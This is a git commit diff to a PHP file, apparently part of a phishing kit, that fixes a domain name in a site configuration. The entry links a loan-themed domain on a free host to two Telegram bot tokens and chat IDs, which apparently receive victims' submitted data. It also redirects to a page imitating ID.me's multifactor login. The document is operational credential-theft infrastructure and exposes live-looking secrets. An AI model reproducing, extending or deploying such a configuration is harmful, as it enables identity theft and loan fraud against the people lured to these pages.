39ebc5b273655862f31e3bb5e82f61ae7b7d7b15
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2026-03-11 17:08:08 +0100

    Fix domain name in new_submit.php

--- new_submit.php
+++ new_submit.php
@@ -147,12 +147,12 @@ $site_map = [
 
 
 
-    'credibleloans.42web.io' => [
+    'credibleloan.42web.io' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8716516943:AAGW8BoxYb7J34yA8truv9rCfM1rvdWYuiQ', 'chat_id' => '7373435774']
         ],
-        'redirect' => 'https://credibleloans.42web.io/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
+        'redirect' => 'https://credibleloan.42web.io/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
     ],
 
 
